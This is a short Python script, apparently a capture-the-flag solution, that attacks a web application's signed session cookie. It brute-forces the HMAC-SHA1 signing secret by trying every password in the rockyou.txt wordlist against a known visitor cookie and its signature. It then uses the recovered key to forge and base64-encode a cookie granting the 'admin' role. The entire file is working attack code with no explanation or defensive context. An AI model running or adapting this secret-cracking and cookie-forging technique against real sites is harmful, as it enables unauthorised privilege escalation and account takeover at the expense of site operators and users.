import hashlib
import hmac
import base64
import json
import base64

cookie = {"info": {"rng":"997646447896744", "username":"admin", "role":"admin"}, "signature":""}
data = '{"rng":997646447896744,"username":"visitor","role":"visitor"}'
signature = "4805c0a901d459ef068f8d43b6aecd3b95810c2b"

def make_digest(message, secret):
    
    message = bytes(message,'utf-8')
    secret = bytes(secret, 'utf-8')
    digester = hmac.new(secret, message, hashlib.sha1)
    signature1 = digester.hexdigest()
    print(signature1)

    
    return str(signature1)


with open("/usr/share/wordlists/rockyou.txt", 'r', encoding='latin-1') as handle:
    keys = handle.read().split("\n")
for key in keys:
    if make_digest(data, key) == signature:
        print("[+] Secret found: " + key)
        break

print(key)
signed = make_digest(json.dumps(cookie["info"]).replace(" ", ""), key)
cookie["signature"] = signed

print(base64.b64encode(bytes(json.dumps(cookie).replace(" ", ""), "utf-8")))